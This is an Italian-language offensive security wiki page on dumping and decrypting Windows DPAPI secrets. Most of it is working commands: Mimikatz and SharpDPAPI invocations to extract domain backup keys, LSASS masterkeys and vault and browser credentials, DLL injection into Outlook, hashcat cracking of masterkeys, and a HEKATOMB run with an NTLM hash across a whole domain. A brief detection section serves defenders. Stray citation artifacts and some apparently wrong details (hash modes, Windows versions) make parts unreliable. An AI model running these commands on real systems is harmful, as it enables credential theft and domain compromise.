# DPAPI - Estrazione delle Passwords

{{#include ../../banners/hacktricks-training.md}}



## Cos'è DPAPI

L'API di Protezione Dati (DPAPI) è principalmente utilizzata all'interno del sistema operativo Windows per la **cifratura simmetrica di chiavi private asimmetriche**, sfruttando segreti utente o di sistema come una fonte significativa di entropia. Questo approccio semplifica la cifratura per gli sviluppatori consentendo loro di cifrare i dati utilizzando una chiave derivata dai segreti di accesso dell'utente o, per la cifratura di sistema, dai segreti di autenticazione del dominio del sistema, evitando così la necessità per gli sviluppatori di gestire la protezione della chiave di cifratura.

Il modo più comune per utilizzare DPAPI è attraverso le funzioni **`CryptProtectData` e `CryptUnprotectData`**, che consentono alle applicazioni di cifrare e decifrare i dati in modo sicuro con la sessione del processo attualmente connesso. Ciò significa che i dati cifrati possono essere decifrati solo dallo stesso utente o sistema che li ha cifrati.

Inoltre, queste funzioni accettano anche un **parametro `entropy`** che sarà utilizzato durante la cifratura e la decifratura; pertanto, per decifrare qualcosa cifrato utilizzando questo parametro, è necessario fornire lo stesso valore di entropia che è stato utilizzato durante la cifratura.

### Generazione della chiave degli utenti

Il DPAPI genera una chiave unica (chiamata **`pre-key`**) per ogni utente basata sulle loro credenziali. Questa chiave è derivata dalla password dell'utente e da altri fattori e l'algoritmo dipende dal tipo di utente ma finisce per essere un SHA1. Ad esempio, per gli utenti di dominio, **dipende dall'hash HTLM dell'utente**.

Questo è particolarmente interessante perché se un attaccante riesce a ottenere l'hash della password dell'utente, può:

- **Decifrare qualsiasi dato che è stato cifrato utilizzando DPAPI** con la chiave di quell'utente senza bisogno di contattare alcuna API
- Provare a **crackare la password** offline cercando di generare la chiave DPAPI valida

Inoltre, ogni volta che alcuni dati vengono cifrati da un utente utilizzando DPAPI, viene generata una nuova **chiave master**. Questa chiave master è quella effettivamente utilizzata per cifrare i dati. Ogni chiave master è fornita con un **GUID** (Identificatore Unico Globale) che la identifica.

Le chiavi master sono memorizzate nella directory **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, dove `{SID}` è l'Identificatore di Sicurezza di quell'utente. La chiave master è memorizzata cifrata dalla **`pre-key`** dell'utente e anche da una **chiave di backup del dominio** per il recupero (quindi la stessa chiave è memorizzata cifrata 2 volte da 2 pass diversi).

Nota che la **chiave di dominio utilizzata per cifrare la chiave master si trova nei controller di dominio e non cambia mai**, quindi se un attaccante ha accesso al controller di dominio, può recuperare la chiave di backup del dominio e decifrare le chiavi master di tutti gli utenti nel dominio.

I blob cifrati contengono il **GUID della chiave master** che è stata utilizzata per cifrare i dati all'interno delle sue intestazioni.

> [!TIP]
> I blob cifrati da DPAPI iniziano con **`01 00 00 00`**

Trova le chiavi master:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Questo è l'aspetto di un insieme di Master Keys di un utente:

![](<../../images/image (1121).png>)

### Generazione della chiave macchina/sistema

Questa è la chiave utilizzata dalla macchina per crittografare i dati. Si basa sul **DPAPI_SYSTEM LSA secret**, che è una chiave speciale a cui può accedere solo l'utente SYSTEM. Questa chiave viene utilizzata per crittografare i dati che devono essere accessibili dal sistema stesso, come le credenziali a livello di macchina o i segreti a livello di sistema.

Nota che queste chiavi **non hanno un backup di dominio**, quindi sono accessibili solo localmente:

- **Mimikatz** può accedervi estraendo i segreti LSA utilizzando il comando: `mimikatz lsadump::secrets`
- Il segreto è memorizzato all'interno del registro, quindi un amministratore potrebbe **modificare i permessi DACL per accedervi**. Il percorso del registro è: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### Dati protetti da DPAPI

Tra i dati personali protetti da DPAPI ci sono:

- Credenziali di Windows
- Password di Internet Explorer e Google Chrome e dati di completamento automatico
- Password per e-mail e account FTP interni per applicazioni come Outlook e Windows Mail
- Password per cartelle condivise, risorse, reti wireless e Windows Vault, inclusi i tasti di crittografia
- Password per connessioni desktop remoto, .NET Passport e chiavi private per vari scopi di crittografia e autenticazione
- Password di rete gestite da Credential Manager e dati personali in applicazioni che utilizzano CryptProtectData, come Skype, MSN messenger e altro
- Blob crittografati all'interno del registro
- ...

I dati protetti dal sistema includono:
- Password Wifi
- Password di attività pianificate
- ...

### Opzioni di estrazione della chiave master

- Se l'utente ha privilegi di amministratore di dominio, può accedere alla **chiave di backup del dominio** per decrittografare tutte le chiavi master degli utenti nel dominio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Con privilegi di amministratore locale, è possibile **accedere alla memoria LSASS** per estrarre le chiavi master DPAPI di tutti gli utenti connessi e la chiave SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Se l'utente ha privilegi di amministratore locale, può accedere al **DPAPI_SYSTEM LSA secret** per decrittografare le chiavi master della macchina:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Se la password o l'hash NTLM dell'utente è conosciuto, puoi **decriptare direttamente le chiavi master dell'utente**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Se sei all'interno di una sessione come utente, è possibile chiedere al DC per la **chiave di backup per decrittare le chiavi master utilizzando RPC**. Se sei un amministratore locale e l'utente è connesso, potresti **rubare il suo token di sessione** per questo:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Elenco Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Accesso ai dati crittografati DPAPI

### Trova dati crittografati DPAPI

I file **protetti** comuni degli utenti si trovano in:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Controlla anche cambiando `\Roaming\` in `\Local\` nei percorsi sopra.

Esempi di enumerazione:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) può trovare blob crittografati DPAPI nel file system, nel registro e nei blob B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Nota che [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (dallo stesso repo) può essere utilizzato per decrittografare utilizzando DPAPI dati sensibili come i cookie.

### Chiavi di accesso e dati

- **Usa SharpDPAPI** per ottenere credenziali da file crittografati DPAPI dalla sessione corrente:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Ottieni informazioni sulle credenziali** come i dati crittografati e il guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Decrittare una masterkey di un utente richiedendo la **domain backup key** utilizzando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Lo strumento **SharpDPAPI** supporta anche questi argomenti per la decrittazione della masterkey (nota come sia possibile utilizzare `/rpc` per ottenere la chiave di backup dei domini, `/password` per utilizzare una password in chiaro, o `/pvk` per specificare un file di chiave privata del dominio DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Decrittare i dati utilizzando una masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Lo strumento **SharpDPAPI** supporta anche questi argomenti per la decrittazione di `credentials|vaults|rdg|keepass|triage|blob|ps` (nota come sia possibile utilizzare `/rpc` per ottenere la chiave di backup dei domini, `/password` per utilizzare una password in chiaro, `/pvk` per specificare un file di chiave privata del dominio DPAPI, `/unprotect` per utilizzare la sessione dell'utente corrente...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Decrittare alcuni dati utilizzando **la sessione utente corrente**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Gestione dell'Entropia Opzionale ("Entropia di terze parti")

Alcune applicazioni passano un valore di **entropia** aggiuntivo a `CryptProtectData`. Senza questo valore, il blob non può essere decrittato, anche se la chiave master corretta è nota. Ottenere l'entropia è quindi essenziale quando si mirano credenziali protette in questo modo (ad es. Microsoft Outlook, alcuni client VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) è una DLL in modalità utente che aggancia le funzioni DPAPI all'interno del processo target e registra in modo trasparente qualsiasi entropia opzionale fornita. Eseguire EntropyCapture in modalità **DLL-injection** contro processi come `outlook.exe` o `vpnclient.exe` produrrà un file che mappa ciascun buffer di entropia al processo chiamante e al blob. L'entropia catturata può essere successivamente fornita a **SharpDPAPI** (`/entropy:`) o **Mimikatz** (`/entropy:<file>`) per decrittare i dati. citeturn5search0
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ha introdotto un formato di masterkey **context 3** a partire da Windows 10 v1607 (2016). `hashcat` v6.2.6 (dicembre 2023) ha aggiunto modalità hash **22100** (DPAPI masterkey v1 context), **22101** (context 1) e **22102** (context 3) consentendo il cracking accelerato da GPU delle password degli utenti direttamente dal file masterkey. Gli attaccanti possono quindi eseguire attacchi a dizionario o di forza bruta senza interagire con il sistema target. citeturn8search1

`DPAPISnoop` (2024) automatizza il processo:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Lo strumento può anche analizzare i blob di Credential e Vault, decrittarli con chiavi compromesse ed esportare le password in chiaro.


### Accedere ai dati di un'altra macchina

In **SharpDPAPI e SharpChrome** puoi indicare l'opzione **`/server:HOST`** per accedere ai dati di una macchina remota. Naturalmente, devi essere in grado di accedere a quella macchina e nel seguente esempio si suppone che **la chiave di crittografia di backup del dominio sia nota**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Altri strumenti

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) è uno strumento che automatizza l'estrazione di tutti gli utenti e computer dal directory LDAP e l'estrazione della chiave di backup del controller di dominio tramite RPC. Lo script risolverà quindi tutti gli indirizzi IP dei computer e eseguirà un smbclient su tutti i computer per recuperare tutti i blob DPAPI di tutti gli utenti e decrittografare tutto con la chiave di backup del dominio.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Con l'elenco dei computer estratti da LDAP puoi trovare ogni sottorete anche se non le conoscevi!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) può estrarre segreti protetti da DPAPI automaticamente. La versione 2.x ha introdotto:

* Raccolta parallela di blob da centinaia di host
* Parsing delle masterkey di **context 3** e integrazione automatica con Hashcat
* Supporto per i cookie crittografati "App-Bound" di Chrome (vedi sezione successiva)
* Una nuova modalità **`--snapshot`** per interrogare ripetutamente gli endpoint e differenziare i blob appena creati citeturn1search2

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) è un parser C# per file masterkey/credential/vault che può esportare formati Hashcat/JtR e, opzionalmente, invocare automaticamente la decrittazione. Supporta completamente i formati di masterkey di macchina e utente fino a Windows 11 24H1. citeturn2search0


## Rilevamenti comuni

- Accesso a file in `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` e altre directory correlate a DPAPI.
- Soprattutto da una condivisione di rete come **C$** o **ADMIN$**.
- Uso di **Mimikatz**, **SharpDPAPI** o strumenti simili per accedere alla memoria LSASS o estrarre masterkey.
- Evento **4662**: *Un'operazione è stata eseguita su un oggetto* – può essere correlato all'accesso all'oggetto **`BCKUPKEY`**.
- Evento **4673/4674** quando un processo richiede *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilità 2023-2025 e cambiamenti nell'ecosistema

* **CVE-2023-36004 – Spoofing del canale sicuro DPAPI di Windows** (novembre 2023). Un attaccante con accesso alla rete potrebbe ingannare un membro del dominio per recuperare una chiave di backup DPAPI malevola, consentendo la decrittazione delle masterkey utente. Corretto nell'aggiornamento cumulativo di novembre 2023 – gli amministratori dovrebbero assicurarsi che i DC e le workstation siano completamente aggiornati. citeturn4search0
* **Crittografia dei cookie "App-Bound" di Chrome 127** (luglio 2024) ha sostituito la protezione legacy solo DPAPI con una chiave aggiuntiva memorizzata sotto il **Credential Manager** dell'utente. La decrittazione offline dei cookie ora richiede sia la masterkey DPAPI che la **chiave app-bound avvolta in GCM**. SharpChrome v2.3 e DonPAPI 2.x sono in grado di recuperare la chiave extra quando eseguiti con il contesto utente. citeturn0search0


## Riferimenti

- https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004
- https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html
- https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/
- https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6
- https://github.com/Leftp/DPAPISnoop
- https://pypi.org/project/donpapi/2.0.0/

{{#include ../../banners/hacktricks-training.md}}
